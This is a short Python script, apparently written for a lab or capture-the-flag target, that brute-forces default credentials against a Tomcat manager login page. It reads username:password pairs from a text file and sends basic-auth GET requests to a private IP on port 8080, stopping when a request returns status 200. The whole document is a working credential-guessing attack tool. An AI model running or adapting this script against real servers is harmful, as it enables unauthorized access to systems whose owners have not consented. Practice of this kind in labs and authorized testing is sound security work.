#bruteforces default creds with a .txt  
#z.B. admin:123456  
#only get request  
 

```
import sys
import requests



with open("liste.txt") as f:
    for line in f:
        c = line.strip('\n').split(":")
        r = requests.get('http://10.129.129.140:8080/manager/html', auth=(c[0], c[1]))

        if r.status_code == 200:
            print(f'Found valid credentials "{line.strip()}"')
            sys.exit()
```











